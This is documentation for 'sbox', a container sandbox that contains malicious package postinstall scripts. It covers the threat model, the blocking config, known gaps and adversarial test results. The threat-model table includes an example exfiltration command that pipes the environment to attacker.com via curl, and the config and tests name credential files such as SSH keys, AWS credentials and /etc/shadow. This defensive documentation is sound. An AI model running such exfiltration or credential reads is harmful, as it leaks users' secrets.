# Security Model

## Threat model

sbox is designed to contain **malicious postinstall scripts** — code that runs automatically during `npm install`, `pip install`, `cargo build`, or similar package-manager invocations.

Common attack patterns from real-world supply chain incidents:

| Attack | Example |
|--------|---------|
| Credential read | Read `~/.ssh/id_rsa`, `~/.aws/credentials`, `.npmrc` |
| Environment leak | Dump `process.env` containing `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY` |
| Network exfiltration | `curl https://attacker.com/?data=$(env \| base64)` |
| Workspace write | Modify `.git/hooks/pre-commit` to persist across future runs |
| Privilege escalation | Attempt `sudo`, check for root, read `/etc/shadow` |

## What sbox blocks

### Credential reads

Files listed in `workspace.exclude_paths` are masked with `/dev/null` bind mounts. The postinstall script sees an empty file instead of the real content.

```yaml
workspace:
  exclude_paths:
    - .npmrc
    - .netrc
    - ".ssh/*"
    - ".aws/*"
    - ".docker/*"
    - ".kube/*"
    - "*.pem"
    - "*.key"
```

The home directory is not mounted. A postinstall script reading `~/.ssh/id_rsa` inside the container hits the container's own home directory, which contains no host credentials.

### Environment variable leaks

Only explicitly configured environment variables reach the container. Everything else is stripped.

```yaml
environment:
  pass_through:
    - TERM        # explicitly allowed through
  deny:
    - NPM_TOKEN
    - NODE_AUTH_TOKEN
    - AWS_SECRET_ACCESS_KEY
    - AWS_ACCESS_KEY_ID
    - GITHUB_TOKEN
```

`deny` takes precedence over `pass_through` and over `set`. A variable in both `set` and `deny` is not passed to the container.

### Network exfiltration

With `network: off`, the container has no network stack at all — DNS, TCP, and UDP all fail immediately. With `network_allow`, only whitelisted registries are reachable. See [network.md](network.md) for details.

### Workspace writes

The workspace is mounted read-only by default. Only paths listed in `writable_paths` are writable.

```yaml
workspace:
  writable: false
  writable_paths:
    - node_modules   # only the output directory is writable
```

Path traversal attempts (`../../../etc/crontab`) land outside the container's writable area and fail with `EACCES` or `EROFS`.

### Privilege escalation

```yaml
profiles:
  install:
    no_new_privileges: true
```

`no_new_privileges` prevents the container process from gaining additional privileges via `setuid` binaries or capabilities. Combined with rootless Podman (UID mapping), the container user is never root on the host even if it is root inside the container.

## What sbox does NOT block

### Post-install artifacts on the host

sbox isolates the install step. Once the sandbox exits, installed artifacts (`node_modules`, `.venv`, built binaries) live on the host filesystem. Running `node`, `npx`, `python -m`, or any script from `node_modules/.bin` outside sbox executes that code with full host privileges.

**Mitigation:** route all execution through sbox using a `default` profile:

```bash
sbox run -- npm start
sbox run -- node server.js
```

Or redirect package output into cache volumes so nothing lands in the workspace at all (see the `npm_config_prefix` pattern in the README).

### Raw IP connections when using `network_allow`

`network_allow` enforces by DNS — it blocks hostname lookups and injects allowed IPs into `/etc/hosts`. A postinstall script that hardcodes a known IP bypasses this. `network: off` is the only complete network block.

### Timing and side-channel attacks

sbox does not prevent a malicious package from consuming CPU, memory, or disk within the container's resource limits. It does not enforce resource quotas by default.

### Supply chain attacks on the image itself

If the container image is compromised, all bets are off. Use `image.digest` to pin to a known-good image and `verify_signature: true` with a real signing policy to detect tampering.

## Adversarial test suite

The `tests/adversarial/` directory contains a test harness that installs a real malicious npm package and verifies that every common postinstall attack pattern is blocked.

```bash
./tests/adversarial/run.sh
```

Results from a passing run:

```
── Credential reads (expect: BLOCKED) ──────────────────────────────
  ✓ PASS  read ~/.ssh/id_ed25519                        [BLOCKED]
  ✓ PASS  read ~/.ssh/id_rsa                            [BLOCKED]
  ✓ PASS  read ~/.npmrc                                 [BLOCKED]
  ✓ PASS  read ~/.netrc                                 [BLOCKED]
  ✓ PASS  read ~/.aws/credentials                       [BLOCKED]
  ✓ PASS  read ~/.docker/config.json                    [BLOCKED]
  ✓ PASS  read ~/.kube/config                           [BLOCKED]

── Environment leaks (expect: BLOCKED) ─────────────────────────────
  ✓ PASS  dump sensitive env vars                       [BLOCKED]

── Network exfiltration (expect: BLOCKED) ──────────────────────────
  ✓ PASS  HTTP exfil to attacker server                 [BLOCKED]
  ✓ PASS  raw TCP socket to 1.1.1.1:443                 [BLOCKED]
  ✓ PASS  curl to external URL                          [BLOCKED]
  ✓ PASS  wget to external URL                          [BLOCKED]

── Workspace writes (expect: BLOCKED) ──────────────────────────────
  ✓ PASS  write to workspace root (../../../)           [BLOCKED]
  ✓ PASS  write to .git/hooks/pre-commit                [BLOCKED]

── Privilege escalation (expect: BLOCKED) ──────────────────────────
  ✓ PASS  sudo id                                       [BLOCKED]
  ✓ PASS  check if running as root                      [BLOCKED]
  ✓ PASS  read /etc/shadow                              [BLOCKED]

Results: 17 passed, 0 failed, 0 skipped
All checks passed — sandbox held.
```

Run this on a VM or disposable machine — if a containment check fails, the host may be compromised.

## Strict mode

```bash
sbox --strict-security run -- npm install
```

or in config:

```yaml
runtime:
  strict_security: true
```

Strict mode refuses execution if:

- sensitive host variables are being passed through to the container
- an install-style command runs without a lockfile present
- the image is not pinned to a digest

Use strict mode in CI pipelines where you want hard guarantees, not just best-effort defaults.
